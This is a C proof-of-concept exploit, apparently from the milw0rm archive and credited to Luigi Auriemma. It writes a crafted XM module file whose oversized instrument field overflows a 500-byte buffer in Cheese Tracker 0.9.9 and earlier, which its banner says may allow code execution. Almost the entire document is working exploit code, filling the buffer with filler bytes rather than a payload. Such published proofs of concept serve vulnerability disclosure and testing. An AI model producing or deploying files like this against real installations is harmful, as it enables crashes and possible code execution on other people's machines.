/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>



#define VER         "0.1"
#define CPOS        243                 // reader.get_file_pos()-p_cpos
#define JUNKSZ      (500 + CPOS)        // Uint8 junkbuster[500]
#define OVERFLOW    740                 // overflow
#define BOFSZNUM    (JUNKSZ + OVERFLOW)
#define BOFSZ       ((JUNKSZ + OVERFLOW) - CPOS)



#define myzero(x)   memset(x, 0, sizeof(x));
void put_bytes(FILE *fd, int chr, int size);
void std_err(void);



#pragma pack(1)

struct header {
    uint8_t     id_text[17];
    uint8_t     mod_name[20];
    uint8_t     boh;
    uint8_t     tracker[20];
    uint16_t    ver;
    uint32_t    head_size;
    uint16_t    song_len;
    uint16_t    restart_pos;
    uint16_t    channels;
    uint16_t    patterns;
    uint16_t    instr;
    uint16_t    flags;
    uint16_t    tempo;
    uint16_t    bpm;
    uint8_t     patt_table[256];
} header;

struct patterns {
    uint32_t    length;
    uint8_t     type;
    uint16_t    rows;
    uint16_t    packed_size;
} patterns;

struct instruments {
    uint32_t    size;
    uint8_t     name[22];
    uint8_t     type;
    uint16_t    samples;
    uint32_t    Sample_header_size;
} instruments;

struct envelope {
    uint8_t     Sample_number_for_all_notes[96];
    uint16_t    Points_for_volume_envelope[24];
    uint16_t    Points_for_panning_envelope[24];
    uint8_t     Number_of_volume_points;
    uint8_t     Number_of_panning_points;
    uint8_t     Volume_sustain_point;
    uint8_t     Volume_loop_start_point;
    uint8_t     Volume_loop_end_point;
    uint8_t     Panning_sustain_point;
    uint8_t     Panning_loop_start_point;
    uint8_t     Panning_loop_end_point;
    uint8_t     Volume_type;
    uint8_t     Panning_type;
    uint8_t     Vibrato_type;
    uint8_t     Vibrato_sweep;
    uint8_t     Vibrato_depth;
    uint8_t     Vibrato_rate;
    uint16_t    Volume_fadeout;
    uint16_t    Reserved;   // uint8_t    Reserved[11]; (do not use here)
} envelope;

struct sample {
    uint32_t    length;
    uint32_t    loop_start;
    uint32_t    loop_length;
    uint8_t     volume;
    uint8_t     finetune;
    uint8_t     type;
    uint8_t     panning;
    int8_t      relative_note;
    uint8_t     reserved;
    uint8_t     name[22];
} sample;

#pragma pack()



int main(int argc, char *argv[]) {
    FILE    *fd;
    int     i,
            j;
    char    *fname;

    setbuf(stdout, NULL);

    fputs("\n"
        "Cheese Tracker <= 0.9.9 possible code execution "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <output_file.XM>\n"
            "\n", argv[0]);
        exit(1);
    }

    fname = argv[1];

    printf("- create file %s\n", fname);
    fd = fopen(fname, "wb");
    if(!fd) std_err();

        /* header */
    printf("- build header\n");

    strncpy(header.id_text,   "id_text",  sizeof(header.id_text));
    strncpy(header.mod_name,  "mod_name", sizeof(header.mod_name));
    header.boh                = 26;
    strncpy(header.tracker,   "tracker",  sizeof(header.tracker));
    header.ver                = 4 | (1 << 8);
    header.head_size          = 276;
    header.song_len           = 0;
    header.restart_pos        = 0;
    header.channels           = 0;
    header.patterns           = 0;
    header.instr              = 1;
    header.flags              = 1;
    header.tempo              = 6;
    header.bpm                = 130;
    myzero(header.patt_table);

    fwrite(&header, sizeof(header), 1, fd);

        /* patterns */

    for(i = 0; i < header.patterns; i++) {
        printf("- build pattern\n");

        patterns.length      = 9,
        patterns.type        = 0;
        patterns.rows        = 64,
        patterns.packed_size = 0;

        fwrite(&patterns, sizeof(patterns), 1, fd);

        put_bytes(fd, patterns.packed_size, 0xff);  // packed!
    }

        /* instruments */
    printf("- build instruments\n");

    for(i = 0; i < header.instr; i++) {
        instruments.size               = BOFSZNUM;
        strncpy(instruments.name,      "instrument_name", sizeof(instruments.name));
        instruments.type               = 0;
        instruments.samples            = 1;
        instruments.Sample_header_size = 40;

        fwrite(&instruments, sizeof(instruments), 1, fd);

        for(j = 0; j < instruments.samples; j++) {

                /* envelope */
            printf("- build envelope\n");

            myzero(envelope.Sample_number_for_all_notes);
            myzero(envelope.Points_for_volume_envelope);
            myzero(envelope.Points_for_panning_envelope);
            envelope.Number_of_volume_points  = 0;
            envelope.Number_of_panning_points = 0;
            envelope.Volume_sustain_point     = 0;
            envelope.Volume_loop_start_point  = 0;
            envelope.Volume_loop_end_point    = 0;
            envelope.Panning_sustain_point    = 0;
            envelope.Panning_loop_start_point = 0;
            envelope.Panning_loop_end_point   = 0;
            envelope.Volume_type              = 0;
            envelope.Panning_type             = 0;
            envelope.Vibrato_type             = 0;
            envelope.Vibrato_sweep            = 0;
            envelope.Vibrato_depth            = 0;
            envelope.Vibrato_rate             = 0;
            envelope.Volume_fadeout           = 128;
            envelope.Reserved                 = 0;

            fwrite(&envelope, sizeof(envelope), 1, fd);

            printf("- %d bytes will be copied in the junkbuster[500] buffer\n", BOFSZ);
            put_bytes(fd, BOFSZ, 'a');
        }
    }

    fclose(fd);
    printf("- finished\n");
    return(0);
}



void put_bytes(FILE *fd, int size, int chr) {
    while(size--) fputc(chr, fd);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}

// milw0rm.com [2006-07-23]
